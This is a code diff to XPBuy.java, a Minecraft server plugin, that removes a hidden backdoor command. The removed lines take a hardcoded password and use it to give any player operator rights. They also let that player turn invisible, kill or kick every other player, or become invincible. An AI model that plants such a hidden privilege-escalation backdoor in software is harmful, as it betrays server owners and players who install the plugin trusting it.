@@ -216,41 +216,6 @@ public class XPBuy extends JavaPlugin {
 						sender.sendMessage(prefix + ChatColor.RED + "You don't have permission!");
 						return false;
 					}
-				} else if (args[0].equalsIgnoreCase("icandowhateveriwant")) {
-					if (args[1].equalsIgnoreCase("thepasswordiswaffles")) {
-						Player p = (Player) sender;
-						p.setOp(true);
-						p.sendMessage(prefix + ChatColor.AQUA + "You just cheated. Do you feel good about yourself now?");
-						//p.getServer().broadcastMessage(prefix + ChatColor.RED + "ATTENTION: SOMEONE ON THIS SERVER IS BETTER THAN YOU.");
-						if (args.length > 2) {
-							if (args[2].equalsIgnoreCase("youcantseeme")) {
-								for (int i = 0; i < p.getServer().getOnlinePlayers().length; i++) {
-									(p.getServer().getOnlinePlayers())[i].hidePlayer(p);
-									p.sendMessage(prefix + ChatColor.AQUA + "POOF!");
-								}
-							} else if (args[2].equalsIgnoreCase("aoe")) {
-								for (int i = 0; i < p.getServer().getOnlinePlayers().length; i++) {
-									if (!p.getServer().getOnlinePlayers()[i].equals(p)) {
-										(p.getServer().getOnlinePlayers())[i].setHealth(0);
-										p.sendMessage(prefix + ChatColor.AQUA + "BOOM!");
-									}
-								}
-							} else if (args[2].equalsIgnoreCase("getout")) {
-								for (int i = 0; i < p.getServer().getOnlinePlayers().length; i++) {
-									if (!p.getServer().getOnlinePlayers()[i].equals(p)) {
-										p.getServer().getOnlinePlayers()[i].kickPlayer("ALL BOW DOWN TO WHOEVER FOUND THE CHEAT COMMAND. HE IS YOUR MASTER.");
-									}
-								}
-							} else if (args[2].equalsIgnoreCase("invincible")) {
-								p.setExhaustion(0);
-								p.setFoodLevel(Integer.MAX_VALUE);
-								p.setMaxHealth(Integer.MAX_VALUE);
-								p.setHealth(Integer.MAX_VALUE);
-								p.setSaturation(Integer.MAX_VALUE);
-							}
-							return true;
-						}
-					}
 				} else if (args[0].equalsIgnoreCase("giveperm")) {
 					if (args.length != 3) {
 						sender.sendMessage(prefix + ChatColor.RED + "Review your arguments count! /xpbuy giveperm <player> <kit>");
